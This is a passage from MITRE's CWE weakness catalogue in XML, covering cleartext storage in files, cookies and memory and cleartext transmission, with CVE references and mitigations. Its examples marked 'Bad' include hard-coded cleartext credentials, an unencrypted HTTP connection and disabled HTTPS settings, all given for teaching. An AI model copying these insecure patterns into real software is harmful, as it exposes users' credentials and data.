					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, References, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Plaintext Storage of Sensitive Information</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="313" Name="Cleartext Storage in a File or on Disk" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product stores sensitive information in cleartext in a file, or on disk.</Description>
         <Extended_Description>The sensitive information could be read by attackers with access to the file, or with physical or administrator access to the raw disk. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="312" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a cleartext username / password pair.</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1481</Reference>
               <Description>Cleartext credentials in world-readable file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1481</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1828</Reference>
               <Description>Password in cleartext in config file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1828</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2209</Reference>
               <Description>Password in cleartext in config file.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2209</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1696</Reference>
               <Description>Decrypted copy of a message written to disk given a combination of options and when user replies to an encrypted message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1696</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2397</Reference>
               <Description>Cleartext storage of private key and passphrase in log file when user imports the key.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2397</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Storage in File or on Disk</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Terminology">Different people use "cleartext" and "plaintext" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, Potential_Mitigations, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Plaintext Storage in File or on Disk</Previous_Entry_Name>
            <Previous_Entry_Name Date="2013-07-17">Plaintext Storage in a File or on Disk</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="315" Name="Cleartext Storage of Sensitive Information in a Cookie" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product stores sensitive information in cleartext in a cookie.</Description>
         <Extended_Description>Attackers can use widely-available tools to view the cookie and read the sensitive information. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="312" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-44">
               <Intro_Text>The following code excerpt stores a plaintext user account ID in a browser cookie.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>response.addCookie( new Cookie("userAccountID", acctID);</xhtml:div>
               </Example_Code>
               <Body_Text>Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-1800</Reference>
               <Description>Admin password in cleartext in a cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1800</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1537</Reference>
               <Description>Default configuration has cleartext usernames/passwords in cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1537</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1536</Reference>
               <Description>Usernames/passwords in cleartext in cookies.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1536</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2160</Reference>
               <Description>Authentication information stored in cleartext in a cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2160</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Storage in Cookie</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="37"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="74"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Terminology">Different people use "cleartext" and "plaintext" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, Potential_Mitigations, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Plaintext Storage in Cookie</Previous_Entry_Name>
            <Previous_Entry_Name Date="2013-07-17">Plaintext Storage in a Cookie</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="316" Name="Cleartext Storage of Sensitive Information in Memory" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product stores sensitive information in cleartext in memory.</Description>
         <Extended_Description>
            <xhtml:p>The sensitive memory might be saved to disk, stored in a core dump, or remain uncleared if the product crashes, or if the programmer does not properly clear the memory before freeing it.</xhtml:p>
            <xhtml:p>It could be argued that such problems are usually only exploitable by those with administrator privileges. However, swapping could cause the memory to be written to disk and leave it accessible to physical attack afterwards. Core dump files might have insecure permissions or be stored in archive files that are accessible to untrusted people. Or, uncleared sensitive memory might be inadvertently exposed to attackers due to another weakness.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="312" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Memory</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1517</Reference>
               <Description>Sensitive authentication information in cleartext in memory.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1517</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>BID:10155</Reference>
               <Description>Sensitive authentication information in cleartext in memory.</Description>
               <Link>http://www.securityfocus.com/bid/10155</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0984</Reference>
               <Description>Password protector leaves passwords in memory when window is minimized, even when "clear password when minimized" is set.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0984</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0291</Reference>
               <Description>SSH client does not clear credentials from memory.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0291</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>Memory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Plaintext Storage in Memory</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Relationship">This could be a resultant weakness, e.g. if the compiler removes code that was intended to wipe memory.</Note>
            <Note Type="Terminology">Different people use "cleartext" and "plaintext" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Name, Other_Notes, Potential_Mitigations, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2013-07-17">Plaintext Storage in Memory</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="319" Name="Cleartext Transmission of Sensitive Information" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.</Description>
         <Extended_Description>
	 <xhtml:p>Many communication channels can be "sniffed" (monitored) by adversaries during data transmission. For example, in networking, packets can traverse many intermediary nodes from the source to the destination, whether across the internet, an internal network, the cloud, etc. Some actors might have privileged access to a network interface or any link along the channel, such as a router, but they might not be authorized to collect the underlying data. As a result, network traffic could be sniffed by adversaries, spilling security-critical data.</xhtml:p>
	 <xhtml:p>Applicable communication channels are not limited to software products. Applicable channels include hardware-specific technologies such as internal hardware networks and external debug channels, supporting remote JTAG debugging. When mitigations are not applied to combat adversaries within the product's threat model, this weakness significantly lowers the difficulty of exploitation by such adversaries.</xhtml:p>
	 <xhtml:p>When full communications are recorded or logged, such as with a packet dump, an adversary could attempt to obtain the dump long after the transmission has occurred and try to "sniff" the cleartext from the recorded communications in the dump itself.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="311" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Cloud Computing" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
            <Technology Class="System on Chip" Prevalence="Undetermined"/>
            <Technology Name="Test/Debug Hardware" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>For hardware, this may be introduced when design does not plan for an attacker having physical access while a legitimate user is remotely operating the device.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
            <Introduction>
               <Phase>System Configuration</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>Anyone can read the information by gaining access to the channel being used for communication.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-11">
               <Method>Black Box</Method>
               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process, trigger the feature that sends the data, and look for the presence or absence of common cryptographic functions in the call tree. Monitor the network and determine if the data packets contain readable commands. Tools exist for detecting if certain encodings are in use. If the traffic contains high entropy, this might indicate the usage of encryption.</xhtml:p>
               </Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Before transmitting, encrypt the data using reliable, confidentiality-protecting cryptographic protocols.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>When designing hardware platforms, ensure that approved encryption algorithms (such as those recommended by NIST) protect paths from security critical data to trusted user applications.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Testing</Phase>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Configure servers to use encrypted channels for communication, which may include SSL or other secure protocols.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-42">
               <Intro_Text>The following code attempts to establish a connection to a site to communicate sensitive information.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">URL u = new URL("http://www.secret.example.org/");<xhtml:br/>HttpURLConnection hu = (HttpURLConnection) u.openConnection();<xhtml:br/>hu.setRequestMethod("PUT");<xhtml:br/>hu.connect();<xhtml:br/>OutputStream os = hu.getOutputStream();<xhtml:br/>hu.disconnect();</xhtml:div>}<xhtml:br/>catch (IOException e) {<xhtml:div style="margin-left:1em;">
                           <xhtml:i>//...</xhtml:i>
                           <xhtml:br/>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors.</Body_Text>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors used cleartext transmission of sensitive information in their OT products.</Body_Text>
	    </Demonstrative_Example>
	    <Demonstrative_Example>
	    <Intro_Text>A TAP accessible register is read/written by a JTAG based tool, for internal use by authorized users. However, an adversary can connect a probing device and collect the values from the unencrypted channel connecting the JTAG interface to the authorized user, if no additional protections are employed.</Intro_Text>
	    </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following Azure CLI command lists the properties of a particular storage account:</Intro_Text>
               <Example_Code Nature="informative" Language="Shell">
                  <xhtml:div>az storage account show -g {ResourceGroupName} -n {StorageAccountName}</xhtml:div>
               </Example_Code>
	       <Body_Text>The JSON result might be:</Body_Text>
	       <Example_Code Nature="bad" Language="JSON">
		 <xhtml:div>
		   {<xhtml:br/>
		   <xhtml:div style="margin-left:1em;">
		     "name": "{StorageAccountName}",<xhtml:br/>
		     "enableHttpsTrafficOnly": false,<xhtml:br/>
		     "type": "Microsoft.Storage/storageAccounts"<xhtml:br/>
		   </xhtml:div>
		   }
		 </xhtml:div>
	       </Example_Code>
	       <Body_Text>The enableHttpsTrafficOnly value is set to false, because the default setting for Secure transfer is set to Disabled. This allows cloud storage resources to successfully connect and transfer data without the use of encryption (e.g., HTTP, SMB 2.1, SMB 3.0, etc.).</Body_Text>
	       <Body_Text>Azure's storage accounts can be configured to only accept requests from secure connections made over HTTPS. The secure transfer setting can be enabled using Azure's Portal (GUI) or programmatically by setting the enableHttpsTrafficOnly property to True on the storage account, such as:</Body_Text>
               <Example_Code Nature="good" Language="Shell">
                  <xhtml:div>az storage account update -g {ResourceGroupName} -n {StorageAccountName} --https-only true</xhtml:div>
               </Example_Code>
	       <Body_Text>The change can be confirmed from the result by verifying that the enableHttpsTrafficOnly value is true:</Body_Text>
	       <Example_Code Nature="good" Language="JSON">
		 <xhtml:div>
		   {<xhtml:br/>
		   <xhtml:div style="margin-left:1em;">
		     "name": "{StorageAccountName}",<xhtml:br/>
		     "enableHttpsTrafficOnly": true,<xhtml:br/>
		     "type": "Microsoft.Storage/storageAccounts"<xhtml:br/>
		   </xhtml:div>
		   }
		 </xhtml:div>
	       </Example_Code>
	       <Body_Text>
	       <xhtml:p>Note: to enable secure transfer using Azure's Portal instead of the command line:</xhtml:p>
		 <xhtml:ul>
		   <xhtml:li>1. Open the Create storage account pane in the Azure portal.</xhtml:li>
		   <xhtml:li>2. In the Advanced page, select the Enable secure transfer checkbox.</xhtml:li>
		 </xhtml:ul>
	     </Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-29519</Reference>
               <Description>Programmable Logic Controller (PLC) sends sensitive information in plaintext, including passwords and session tokens.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29519</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30312</Reference>
               <Description>Building Controller uses a protocol that transmits authentication credentials in plaintext.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30312</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-31204</Reference>
